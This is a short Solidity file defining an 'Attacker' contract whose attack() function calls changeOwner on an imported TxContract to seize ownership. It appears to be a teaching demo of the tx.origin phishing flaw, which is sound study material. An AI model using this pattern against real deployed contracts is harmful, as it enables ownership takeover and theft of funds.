// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import "./tx-contract.sol";

contract Attacker {

    TxContract txContract;

    constructor(TxContract _txContract){
        txContract = TxContract(_txContract);
    }
    function attack() public {
        txContract.changeOwner(address(this));
    }
}